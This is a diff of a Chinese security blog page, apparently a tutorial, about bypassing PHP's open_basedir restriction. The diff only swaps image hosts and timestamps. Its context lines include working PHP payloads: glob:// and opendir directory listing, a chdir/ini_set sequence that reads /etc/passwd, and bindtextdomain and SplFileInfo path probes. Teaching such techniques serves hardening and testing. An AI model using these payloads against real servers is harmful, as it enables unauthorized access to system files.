@@ -17,22 +17,22 @@
 <meta property="og:site_name" content="MINX&#39;s Blog">
 <meta property="og:description" content="open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/09/09/rSloTZGsadJyDu6.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/09/EvS9ocyKgP8DbNi.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/09/lBz6PtU8GadZwLe.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/09/kZystVrMCLqKj2J.png">
-<meta property="og:updated_time" content="2020-01-29T11:09:35.440Z">
+<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Bypass_open_basedir/1.jpg">
+<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Bypass_open_basedir/2.jpg">
+<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Bypass_open_basedir/3.jpg">
+<meta property="og:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Bypass_open_basedir/4.jpg">
+<meta property="og:updated_time" content="2020-01-29T12:06:45.903Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Bypass_open_basedir">
 <meta name="twitter:description" content="open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/09/rSloTZGsadJyDu6.png">
+<meta name="twitter:image" content="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Bypass_open_basedir/1.jpg">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1580296619386">
+  <link rel="stylesheet" href="/css/style.css?v=1580299938316">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -201,7 +201,7 @@ $a = new DirectoryIterator($c);
 foreach($a as $f){
  echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
 }
-?&gt;</code></pre>输入glob:///*即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件<br><img src="https://i.loli.net/2019/09/09/rSloTZGsadJyDu6.png" alt="openbasedir。1、.png"><h5 id="方式2——opendir-readdir-glob"><a href="#方式2——opendir-readdir-glob" class="headerlink" title="方式2——opendir()+readdir()+glob://"></a>方式2——opendir()+readdir()+glob://</h5>opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。<br>这里结合两个函数来列举根目录中的文件：<pre><code>&lt;?php
+?&gt;</code></pre>输入glob:///*即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件<br><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Bypass_open_basedir/1.jpg" alt="1.png"><h5 id="方式2——opendir-readdir-glob"><a href="#方式2——opendir-readdir-glob" class="headerlink" title="方式2——opendir()+readdir()+glob://"></a>方式2——opendir()+readdir()+glob://</h5>opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。<br>这里结合两个函数来列举根目录中的文件：<pre><code>&lt;?php
 $a = $_GET[&#39;c&#39;];
 if ( $b = opendir($a) ) {
  while ( ($file = readdir($b)) !== false ) {
@@ -209,7 +209,7 @@ if ( $b = opendir($a) ) {
  }
  closedir($b);
 }
-?&gt;</code></pre>效果和方式1是一样的，只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。<h2 id="利用chdir-与ini-set-组合Bypass"><a href="#利用chdir-与ini-set-组合Bypass" class="headerlink" title="利用chdir()与ini_set()组合Bypass"></a>利用chdir()与ini_set()组合Bypass</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4>主要原理是利用了open_basedir存在缺陷的处理逻辑<h4 id="Bypass-2"><a href="#Bypass-2" class="headerlink" title="Bypass"></a>Bypass</h4><img src="https://i.loli.net/2019/09/09/EvS9ocyKgP8DbNi.png" alt="chdir.png"><br>首先呢chdir(‘img’)到文件的子目录，这一步是复合open_basedir的检查的，因此当前的目录就是/var/www/html/img，接着ini_set(“open_basedir”,”..”),由于内部函数的一系列漏洞，这一代码是可以通过检查的，此时open_basedir的工作目录是(/var/www/html/img)+..，接下来就是不断地chdir(“..”),最终将open_basedir改到了根目录下，于是乎就失效了。。。<br>这里是一个利用的payload：<pre><code>mkdir(&#39;minx&#39;);
+?&gt;</code></pre>效果和方式1是一样的，只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。<h2 id="利用chdir-与ini-set-组合Bypass"><a href="#利用chdir-与ini-set-组合Bypass" class="headerlink" title="利用chdir()与ini_set()组合Bypass"></a>利用chdir()与ini_set()组合Bypass</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4>主要原理是利用了open_basedir存在缺陷的处理逻辑<h4 id="Bypass-2"><a href="#Bypass-2" class="headerlink" title="Bypass"></a>Bypass</h4><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Bypass_open_basedir/2.jpg" alt="2.png"><br>首先呢chdir(‘img’)到文件的子目录，这一步是复合open_basedir的检查的，因此当前的目录就是/var/www/html/img，接着ini_set(“open_basedir”,”..”),由于内部函数的一系列漏洞，这一代码是可以通过检查的，此时open_basedir的工作目录是(/var/www/html/img)+..，接下来就是不断地chdir(“..”),最终将open_basedir改到了根目录下，于是乎就失效了。。。<br>这里是一个利用的payload：<pre><code>mkdir(&#39;minx&#39;);
 chdir(&#39;minx&#39;);
 ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
 chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);
@@ -218,7 +218,7 @@ echo file_get_contents(&#39;/etc/passwd&#39;);</code></pre><h2 id="利用bindtex
 printf(&#39;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#39;, ini_get(&#39;open_basedir&#39;));
 $re = bindtextdomain(&#39;xxx&#39;, $_GET[&#39;dir&#39;]);
 var_dump($re);
-?&gt;</code></pre>如果存在文件，将会返回文件的路径<br><img src="https://i.loli.net/2019/09/09/lBz6PtU8GadZwLe.png" alt="bindtextdomain1.png"><br>当然如果文件不存在就会返回false<h2 id="利用SplFileInfo-getRealPath-类方法Bypass"><a href="#利用SplFileInfo-getRealPath-类方法Bypass" class="headerlink" title="利用SplFileInfo::getRealPath()类方法Bypass"></a>利用SplFileInfo::getRealPath()类方法Bypass</h2><h4 id="SplFileInfo类-PHP-5-gt-5-1-2-PHP-7"><a href="#SplFileInfo类-PHP-5-gt-5-1-2-PHP-7" class="headerlink" title="SplFileInfo类(PHP 5 &gt;= 5.1.2, PHP 7)"></a>SplFileInfo类(PHP 5 &gt;= 5.1.2, PHP 7)</h4>SplFileInfo类为单个文件的信息提供高级面向对象的接口。<br>SplFileInfo::getRealPath(PHP 5 &gt;= 5.2.2, PHP 7)<br>SplFileInfo::getRealPath类方法是用于获取文件的绝对路径。<h4 id="Bypass-4"><a href="#Bypass-4" class="headerlink" title="Bypass"></a>Bypass</h4>和上面的bindtextdomain一样，基于报错，payload：<pre><code>&lt;?php
+?&gt;</code></pre>如果存在文件，将会返回文件的路径<br><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Bypass_open_basedir/3.jpg" alt="3.png"><br>当然如果文件不存在就会返回false<h2 id="利用SplFileInfo-getRealPath-类方法Bypass"><a href="#利用SplFileInfo-getRealPath-类方法Bypass" class="headerlink" title="利用SplFileInfo::getRealPath()类方法Bypass"></a>利用SplFileInfo::getRealPath()类方法Bypass</h2><h4 id="SplFileInfo类-PHP-5-gt-5-1-2-PHP-7"><a href="#SplFileInfo类-PHP-5-gt-5-1-2-PHP-7" class="headerlink" title="SplFileInfo类(PHP 5 &gt;= 5.1.2, PHP 7)"></a>SplFileInfo类(PHP 5 &gt;= 5.1.2, PHP 7)</h4>SplFileInfo类为单个文件的信息提供高级面向对象的接口。<br>SplFileInfo::getRealPath(PHP 5 &gt;= 5.2.2, PHP 7)<br>SplFileInfo::getRealPath类方法是用于获取文件的绝对路径。<h4 id="Bypass-4"><a href="#Bypass-4" class="headerlink" title="Bypass"></a>Bypass</h4>和上面的bindtextdomain一样，基于报错，payload：<pre><code>&lt;?php
 echo &#39;&lt;b&gt;open_basedir: &#39; . ini_get(&#39;open_basedir&#39;) . &#39;&lt;/b&gt;&lt;br /&gt;&#39;;
 $info = new SplFileInfo($_GET[&#39;dir&#39;]);
 var_dump($info-&gt;getRealPath());
@@ -241,7 +241,7 @@ function isexists($errno, $errstr)
              printf(&quot;%s &lt;br/&gt;&quot;, $matches[1]);
      }
 }
-?&gt;</code></pre>可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：<br><img src="https://i.loli.net/2019/09/09/kZystVrMCLqKj2J.png" alt="realpath.png"></li>
+?&gt;</code></pre>可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：<br><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Bypass_open_basedir/4.jpg" alt="4.png"></li>
 </ol>
 
   </article>
@@ -290,7 +290,7 @@ function isexists($errno, $errstr)
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1580296619358"></script>
+<script src="/js/app.js?v=1580299938288"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
   
